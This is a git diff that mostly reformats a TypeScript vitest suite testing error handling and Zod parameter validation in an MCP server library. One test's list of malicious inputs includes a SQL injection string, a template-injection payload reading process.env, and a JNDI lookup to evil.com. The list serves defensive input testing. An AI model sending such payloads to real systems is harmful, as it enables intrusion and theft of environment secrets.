@@ -1,9 +1,9 @@
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import "reflect-metadata";
 import { z } from "zod";
+import { Param, Tool } from "../../src/core/decorators.js";
+import { ToolNotFoundError, ToolValidationError } from "../../src/core/errors.js";
 import { BestMCP } from "../../src/core/server.js";
-import { Tool, Param } from "../../src/core/decorators.js";
-import { ToolNotFoundError, ToolValidationError, ZodValidationError } from "../../src/core/errors.js";
 
 // Mock console methods to avoid noise in tests
 const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
@@ -41,17 +41,21 @@ class ErrorTestService {
 class ComplexParameterService {
   @Tool("复杂对象参数")
   complexObject(
-    @Param(z.object({
-      user: z.object({
-        name: z.string(),
-        age: z.number().min(0),
-        email: z.string().email().optional()
+    @Param(
+      z.object({
+        user: z.object({
+          name: z.string(),
+          age: z.number().min(0),
+          email: z.string().email().optional(),
+        }),
+        settings: z.object({
+          theme: z.enum(["light", "dark"]),
+          notifications: z.boolean(),
+        }),
       }),
-      settings: z.object({
-        theme: z.enum(['light', 'dark']),
-        notifications: z.boolean()
-      })
-    }), "复杂参数") params: any
+      "复杂参数",
+    )
+    params: any,
   ): string {
     return `处理用户: ${params.user.name}`;
   }
@@ -59,21 +63,25 @@ class ComplexParameterService {
   @Tool("数组参数工具")
   arrayTool(
     @Param(z.array(z.string()), "字符串数组") items: string[],
-    @Param(z.number().optional(), "乘数") multiplier?: number
+    @Param(z.number().optional(), "乘数") multiplier?: number,
   ): number {
     return items.length * (multiplier || 1);
   }
 
   @Tool("嵌套参数工具")
   nestedParams(
-    @Param(z.object({
-      level1: z.object({
-        level2: z.object({
-          value: z.string(),
-          count: z.number()
-        })
-      })
-    }), "嵌套参数") data: any
+    @Param(
+      z.object({
+        level1: z.object({
+          level2: z.object({
+            value: z.string(),
+            count: z.number(),
+          }),
+        }),
+      }),
+      "嵌套参数",
+    )
+    data: any,
   ): string {
     return `${data.level1.level2.value} x ${data.level1.level2.count}`;
   }
@@ -92,8 +100,7 @@ describe("错误处理和边界条件测试", () => {
 
   describe("工具不存在错误", () => {
     it("应该抛出 ToolNotFoundError", async () => {
-      await expect(mcp.executeTool("nonexistent", {}))
-        .rejects.toThrow(ToolNotFoundError);
+      await expect(mcp.executeTool("nonexistent", {})).rejects.toThrow(ToolNotFoundError);
     });
 
     it("应该提供详细的错误信息", async () => {
@@ -106,30 +113,25 @@ describe("错误处理和边界条件测试", () => {
     });
 
     it("应该处理空工具名", async () => {
-      await expect(mcp.executeTool("", {}))
-        .rejects.toThrow(ToolNotFoundError);
+      await expect(mcp.executeTool("", {})).rejects.toThrow(ToolNotFoundError);
     });
 
     it("应该处理特殊字符工具名", async () => {
-      await expect(mcp.executeTool("!@#$%^&*()", {}))
-        .rejects.toThrow(ToolNotFoundError);
+      await expect(mcp.executeTool("!@#$%^&*()", {})).rejects.toThrow(ToolNotFoundError);
     });
   });
 
   describe("参数验证错误", () => {
     it("应该检测缺失的必需参数", async () => {
-      await expect(mcp.executeTool("normalTool", {}))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("normalTool", {})).rejects.toThrow(ToolValidationError);
     });
 
     it("应该检测类型错误", async () => {
-      await expect(mcp.executeTool("normalTool", { param: 123 }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("normalTool", { param: 123 })).rejects.toThrow(ToolValidationError);
     });
 
     it("应该检测无效的枚举值", async () => {
-      await expect(mcp.executeTool("normalTool", { param: "valid" }))
-        .resolves.toBe("valid");
+      await expect(mcp.executeTool("normalTool", { param: "valid" })).resolves.toBe("valid");
 
       // 这个测试验证了类型检查正常工作
       const result = await mcp.executeTool("normalTool", { param: "test" });
@@ -137,11 +139,9 @@ describe("错误处理和边界条件测试", () => {
     });
 
     it("应该处理 null 和 undefined 参数", async () => {
-      await expect(mcp.executeTool("normalTool", { param: null }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("normalTool", { param: null })).rejects.toThrow(ToolValidationError);
 
-      await expect(mcp.executeTool("normalTool", { param: undefined }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("normalTool", { param: undefined })).rejects.toThrow(ToolValidationError);
     });
   });
 
@@ -151,9 +151,9 @@ describe("错误处理和边界条件测试", () => {
         level1: {
           level2: {
             value: "test",
-            count: 5
-          }
-        }
+            count: 5,
+          },
+        },
       };
 
       const result = await mcp.executeTool("nestedParams", validParams);
@@ -165,19 +165,18 @@ describe("错误处理和边界条件测试", () => {
         level1: {
           level2: {
             value: 123, // 错误：应该是字符串
-            count: 5
-          }
-        }
+            count: 5,
+          },
+        },
       };
 
-      await expect(mcp.executeTool("nestedParams", invalidParams))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("nestedParams", invalidParams)).rejects.toThrow(ToolValidationError);
     });
 
     it("应该验证数组参数", async () => {
       const validParams = {
         items: ["a", "b", "c"],
-        multiplier: 2
+        multiplier: 2,
       };
 
       const result = await mcp.executeTool("arrayTool", validParams);
@@ -187,17 +186,16 @@ describe("错误处理和边界条件测试", () => {
     it("应该检测数组中的错误类型", async () => {
       const invalidParams = {
         items: ["a", 123, "c"], // 包含数字
-        multiplier: 2
+        multiplier: 2,
       };
 
-      await expect(mcp.executeTool("arrayTool", invalidParams))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("arrayTool", invalidParams)).rejects.toThrow(ToolValidationError);
     });
 
     it("应该处理空数组", async () => {
       const emptyArrayParams = {
         items: [],
-        multiplier: 5
+        multiplier: 5,
       };
 
       const result = await mcp.executeTool("arrayTool", emptyArrayParams);
@@ -216,23 +214,19 @@ describe("错误处理和边界条件测试", () => {
       expect(result2).toBe(200);
 
       // 测试超出范围
-      await expect(mcp.executeTool("boundaryTest", { value: -1 }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("boundaryTest", { value: -1 })).rejects.toThrow(ToolValidationError);
 
-      await expect(mcp.executeTool("boundaryTest", { value: 101 }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("boundaryTest", { value: 101 })).rejects.toThrow(ToolValidationError);
     });
 
     it("应该处理极大数值", async () => {
       const largeNumber = Number.MAX_SAFE_INTEGER;
-      await expect(mcp.executeTool("boundaryTest", { value: largeNumber }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("boundaryTest", { value: largeNumber })).rejects.toThrow(ToolValidationError);
     });
 
     it("应该处理极小数值", async () => {
       const smallNumber = Number.MIN_SAFE_INTEGER;
-      await expect(mcp.executeTool("boundaryTest", { value: smallNumber }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("boundaryTest", { value: smallNumber })).rejects.toThrow(ToolValidationError);
     });
   });
 
@@ -263,13 +257,11 @@ describe("错误处理和边界条件测试", () => {
 
   describe("运行时错误处理", () => {
     it("应该处理同步工具抛出的错误", async () => {
-      await expect(mcp.executeTool("throwError", { param: "test" }))
-        .rejects.toThrow("测试错误: test");
+      await expect(mcp.executeTool("throwError", { param: "test" })).rejects.toThrow("测试错误: test");
     });
 
     it("应该处理异步工具抛出的错误", async () => {
-      await expect(mcp.executeTool("asyncError", { param: "async" }))
-        .rejects.toThrow("异步错误: async");
+      await expect(mcp.executeTool("asyncError", { param: "async" })).rejects.toThrow("异步错误: async");
     });
 
     it("应该优雅地处理未捕获的异常", async () => {
@@ -284,10 +276,10 @@ describe("错误处理和边界条件测试", () => {
 
   describe("内存边界测试", () => {
     it("应该处理大量并发请求", async () => {
-      vi.spyOn(mcp as any, 'setupToolRequestHandlers').mockImplementation(() => {});
-      vi.spyOn(mcp['transportManager'], 'startCurrentTransport').mockResolvedValue(undefined);
+      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
+      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
 
-      await mcp.run({ transport: 'stdio' });
+      await mcp.run({ transport: "stdio" });
 
       const promises = [];
       for (let i = 0; i < 100; i++) {
@@ -308,23 +300,22 @@ describe("错误处理和边界条件测试", () => {
         data: new Array(1000).fill(0).map((_, i) => ({
           id: i,
           name: `item-${i}`,
-          description: `This is item number ${i} with some additional text to make it longer`
-        }))
+          description: `This is item number ${i} with some additional text to make it longer`,
+        })),
       };
 
       // 这个测试主要验证系统不会因为大对象而崩溃
       // 由于我们的工具不接受这种参数，预期会抛出验证错误
-      await expect(mcp.executeTool("normalTool", { param: largeObject }))
-        .rejects.toThrow(ToolValidationError);
+      await expect(mcp.executeTool("normalTool", { param: largeObject })).rejects.toThrow(ToolValidationError);
     });
   });
 
   describe("状态一致性测试", () => {
     it("应该在错误后保持服务器状态", async () => {
-      vi.spyOn(mcp as any, 'setupToolRequestHandlers').mockImplementation(() => {});
-      vi.spyOn(mcp['transportManager'], 'startCurrentTransport').mockResolvedValue(undefined);
+      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
+      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
 
-      await mcp.run({ transport: 'stdio' });
+      await mcp.run({ transport: "stdio" });
 
       // 执行一些成功的操作
       const result1 = await mcp.executeTool("normalTool", { param: "success1" });
@@ -333,7 +324,7 @@ describe("错误处理和边界条件测试", () => {
       // 执行一个会失败的操作
       try {
         await mcp.executeTool("throwError", { param: "error" });
-      } catch (error) {
+      } catch (_error) {
         // 预期的错误
       }
 
@@ -347,16 +338,16 @@ describe("错误处理和边界条件测试", () => {
     });
 
     it("应该在多次错误后保持稳定", async () => {
-      vi.spyOn(mcp as any, 'setupToolRequestHandlers').mockImplementation(() => {});
-      vi.spyOn(mcp['transportManager'], 'startCurrentTransport').mockResolvedValue(undefined);
+      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
+      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
 
-      await mcp.run({ transport: 'stdio' });
+      await mcp.run({ transport: "stdio" });
 
       // 连续执行多个错误操作
       for (let i = 0; i < 10; i++) {
         try {
           await mcp.executeTool("nonexistent", {});
-        } catch (error) {
+        } catch (_error) {
           // 预期的错误
         }
       }
@@ -369,19 +360,16 @@ describe("错误处理和边界条件测试", () => {
 
   describe("配置边界测试", () => {
     it("应该处理极端的配置值", async () => {
-      vi.spyOn(mcp as any, 'setupToolRequestHandlers').mockImplementation(() => {});
-      vi.spyOn(mcp['transportManager'], 'startCurrentTransport').mockResolvedValue(undefined);
+      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
+      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
 
       // 测试极端端口号
-      await expect(mcp.run({ transport: 'http', port: 0 }))
-        .rejects.toThrow();
+      await expect(mcp.run({ transport: "http", port: 0 })).rejects.toThrow();
 
-      await expect(mcp.run({ transport: 'http', port: 65536 }))
-        .rejects.toThrow();
+      await expect(mcp.run({ transport: "http", port: 65536 })).rejects.toThrow();
 
       // 测试极端主机名
-      await expect(mcp.run({ transport: 'http', host: "" }))
-        .rejects.toThrow();
+      await expect(mcp.run({ transport: "http", host: "" })).rejects.toThrow();
     });
   });
 
@@ -392,7 +380,7 @@ describe("错误处理和边界条件测试", () => {
         "'; DROP TABLE users; --",
         "\0\x00\x00\x00",
         "{{constructor.constructor('return process')().env}}",
-        "${jndi:ldap://evil.com/a}"
+        "${jndi:ldap://evil.com/a}",
       ];
 
       for (const input of maliciousInputs) {
@@ -411,10 +399,10 @@ describe("错误处理和边界条件测试", () => {
 
   describe("并发错误处理", () => {
     it("应该正确处理并发中的混合成功和失败", async () => {
-      vi.spyOn(mcp as any, 'setupToolRequestHandlers').mockImplementation(() => {});
-      vi.spyOn(mcp['transportManager'], 'startCurrentTransport').mockResolvedValue(undefined);
+      vi.spyOn(mcp as any, "setupToolRequestHandlers").mockImplementation(() => {});
+      vi.spyOn(mcp["transportManager"], "startCurrentTransport").mockResolvedValue(undefined);
 
-      await mcp.run({ transport: 'stdio' });
+      await mcp.run({ transport: "stdio" });
 
       const promises = [];
 
@@ -435,10 +423,10 @@ describe("错误处理和边界条件测试", () => {
       const results = await Promise.all(promises);
 
       // 验证成功的请求都返回了正确结果
-      const successResults = results.filter(r => r !== "error");
+      const successResults = results.filter((r) => r !== "error");
       expect(successResults).toHaveLength(7); // 20个中应该有7个成功
 
-      successResults.forEach((result, index) => {
+      successResults.forEach((result, _index) => {
         expect(result).toMatch(/^success-\d+$/);
       });
     });
